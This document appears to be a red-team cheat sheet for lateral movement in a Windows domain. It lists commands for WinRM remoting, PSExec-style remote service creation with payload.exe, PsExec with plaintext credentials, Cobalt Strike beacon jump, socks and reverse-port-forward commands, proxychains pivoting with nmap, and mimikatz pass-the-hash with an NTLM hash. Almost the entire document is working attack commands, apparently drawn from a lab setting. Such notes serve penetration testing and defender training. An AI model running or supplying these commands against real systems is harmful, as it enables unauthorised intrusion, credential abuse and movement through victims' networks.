## WinRM

### Enable WinRM (5985,5986,47001)
```powershell
Enable-PSRemoting -SkipNetworkProfileCheck -Force
Set-Item wsman:\localhost\client\trustedhosts * -Force
```

### Authenticate with Credential
```powershell
$Password = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force;
$Credential = New-Object System.Management.Automation.PSCredential("marvel\administrator", $Password);
```

### Invoke-Command
```powershell
Invoke-Command -ComputerName hydra-dc -ScriptBlock {hostname; whoami} -Credential $Credential
```

### PowerShell Session
```powershell
Enter-PSSession -ComputerName hydra-dc -Credential $Credential
```

### Cobalt
```powershell
jump winrm64 dc1 smb1
remote-exec winrm dc1 whoami
```

## PSExec

- Copy a service binary to the ADMIN$ share over SMB
- Create a service on the remote machine pointing to the binary
- Remotely start the service
- When exited, stop the service and delete the binary
```powershell
copy payload.exe \\dc1\ADMIN$
sc \\dc1 create shell binPath= "C:\Windows\payload.exe"
sc \\dc1 start shell
del \\dc1\ADMIN$\payload.exe
sc \\dc1 delete shell
```

- OR Without Binary
```powershell
sc \\localhost create shell binPath= "%COMSPEC% /Q /c echo whoami ^> C:\Windows\take1.txt > C:\Windows\take1.bat & %COMSPEC% /Q /c C:\Windows\take1.bat"
sc \\dc1 start shell
type \\dc1\ADMIN$\take1.txt
del \\dc1\ADMIN$\take1.txt \\dc1\ADMIN$\take1.bat
sc \\dc1 delete shell
```

### PsExec.exe
```powershell
psexec.exe \\dc1 -accepteula cmd.exe -u marvel\administrator -p P@ssw0rd
```

### Cobalt
```powershell
jump psexec64 dc1 smb1
jump psexec_psh dc1 smb1
remote-exec psexec dc1 whoami
```

## Pivoting (Socks Proxy)
```powershell
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
```

### Linux
```powershell
sudo nano /etc/proxychains.conf
	socks5 127.0.0.1 1080 socks_user socks_password
proxychains nmap -nn -Pn -sT -p445,3389,4444,5985 10.10.122.10
```

### Windows
```powershell
Profile > Proxy Servers > Add
	Server: 10.10.5.50
	Port: 1080
	Protocol: SOCKS Version5
	Enable_Authentication
Profile > Proxification Rules > Add
	Name: Tools
	Applications: Any
	Target hosts: 10.10.120.0/24;10.10.122.0/24
	Target ports: Any
	Action: Proxy SOCKS5 10.10.5.50
```
```powershell
cmd> runas /netonly /user:DEV\bfarmer mmc.exe
mimikatz> privilege::debug
mimikatz> sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
```

### Browser
```powershell
FoxyProxy
	Title: Beacon
	Proxy Type: SOCKS5
	Proxy IP: 10.10.5.50
	Port: 1080
	Username: socks_user
	Password: socks_password
```

## Pivoting (Reverse Port Forwards)

### Allow Firewall
```powershell
New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

### Victim_Port:8080 Attacker_Port:80
```powershell
beacon> rportfwd 8080 127.0.0.1 80
beacon> run netstat -anp TCP
```
